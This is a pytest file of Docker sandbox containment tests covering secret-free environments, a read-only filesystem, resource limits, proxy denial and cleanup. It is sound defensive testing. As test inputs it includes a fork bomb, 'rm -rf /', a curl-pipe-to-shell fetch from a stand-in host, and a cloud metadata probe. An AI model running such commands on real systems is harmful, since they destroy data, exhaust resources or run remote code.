"""Real containment tests. No image builds, external credentials or LLM calls."""
import json
import os
import shutil
import uuid

import pytest

from app.models import Expectation, Step
from sandbox.runner import DockerRunner, docker

pytestmark = [pytest.mark.docker, pytest.mark.skipif(
    os.getenv("RUN_DOCKER_TESTS") != "1" or not shutil.which("docker"),
    reason="Requires Docker and opt-in RUN_DOCKER_TESTS=1 (prebuilt images)",
)]


async def test_real_sandbox_files_no_secrets_readonly_and_cleanup(settings):
    runner = DockerRunner(uuid.uuid4().hex, settings)
    try:
        await runner.start("")
        info = json.loads(await docker("inspect", runner.name))[0]
        assert not info["Config"].get("Env")
        assert info["HostConfig"]["ReadonlyRootfs"]
        assert info["HostConfig"]["Memory"] == 512 * 1024 * 1024
        assert info["HostConfig"]["PidsLimit"] == 128
        assert not info["HostConfig"].get("Binds")
        result = await runner.run(Step(id=1, command="printf hello > hello.txt; cat hello.txt", expectations=[
            Expectation(kind="stdout", value="hello", source_quote="hello"),
            Expectation(kind="file", value="hello.txt", source_quote="hello.txt"),
        ]), 5)
        assert result.exit_code == 0 and result.matched == [True, True]
        result = await runner.run(Step(id=2, command="touch /should-not-exist"), 5)
        assert result.exit_code != 0
        result = await runner.run(Step(id=3, command="python3 -c 'import os; assert not any(\"KEY\" in k or \"TOKEN\" in k for k in os.environ)'"), 5)
        assert result.exit_code == 0
    finally:
        cleanup = await runner.cleanup()
    assert cleanup.sandbox_removed and cleanup.proxy_removed and cleanup.network_removed


async def test_proxy_denial_direct_network_and_next_job(settings):
    runner = DockerRunner(uuid.uuid4().hex, settings)
    try:
        await runner.start("")
        denied = await runner.run(Step(id=1, command="curl -fsS https://blocked.invalid/"), 10)
        assert denied.exit_code != 0
        direct = await runner.run(Step(id=2, command="/usr/bin/curl.real --noproxy '*' --connect-timeout 2 http://1.1.1.1/"), 5)
        assert direct.exit_code != 0
        metadata = await runner.run(Step(id=3, command="/usr/bin/curl.real --noproxy '*' --connect-timeout 2 http://169.254.169.254/"), 5)
        assert metadata.exit_code != 0
    finally:
        cleanup = await runner.cleanup()
    assert "blocked.invalid" in cleanup.denied_destinations
    fresh = DockerRunner(uuid.uuid4().hex, settings)
    try:
        await fresh.start("")
        result = await fresh.run(Step(id=1, command="test ! -e /work/hello.txt; printf healthy"), 5)
        assert result.exit_code == 0 and result.stdout == "healthy"
    finally:
        assert (await fresh.cleanup()).sandbox_removed


async def test_timeout_kills_descendants(settings):
    runner = DockerRunner(uuid.uuid4().hex, settings)
    try:
        await runner.start("")
        result = await runner.run(Step(id=1, command="sleep 120 & wait"), 0.3)
        assert "timeout" in result.limits
        assert not runner.alive
    finally:
        assert (await runner.cleanup()).sandbox_removed


async def test_process_exhaustion_is_contained(settings):
    runner = DockerRunner(uuid.uuid4().hex, settings)
    try:
        await runner.start("")
        result = await runner.run(Step(id=1, command=":(){ :|:& }; :"), 3)
        assert result.exit_code != 0 or result.limits
        assert not runner.alive
    finally:
        assert (await runner.cleanup()).sandbox_removed


async def test_memory_limit_records_oom(settings):
    runner = DockerRunner(uuid.uuid4().hex, settings)
    try:
        await runner.start("")
        result = await runner.run(Step(id=1, command="python3 -c 'data = bytearray(800 * 1024 * 1024)'"), 10)
        assert result.exit_code != 0
        if result.metrics_available:
            assert "oom" in result.limits
    finally:
        assert (await runner.cleanup()).sandbox_removed


async def test_hostile_script_and_root_deletion_are_contained(settings):
    runner = DockerRunner(uuid.uuid4().hex, settings)
    try:
        await runner.start("")
        result = await runner.run(Step(id=1, command="set -o pipefail; curl -fsS https://blocked.invalid/install.sh | sh"), 5)
        assert result.exit_code != 0
        result = await runner.run(Step(id=2, command="rm -rf /"), 3)
        assert result.exit_code != 0 or result.limits
    finally:
        assert (await runner.cleanup()).sandbox_removed


async def test_allowlisted_package_endpoint(settings):
    runner = DockerRunner(uuid.uuid4().hex, settings)
    try:
        await runner.start("")
        result = await runner.run(Step(id=1, command="curl -fsSI https://pypi.org/simple/"), 15)
        assert result.exit_code == 0
        assert "200" in result.stdout
    finally:
        assert (await runner.cleanup()).sandbox_removed
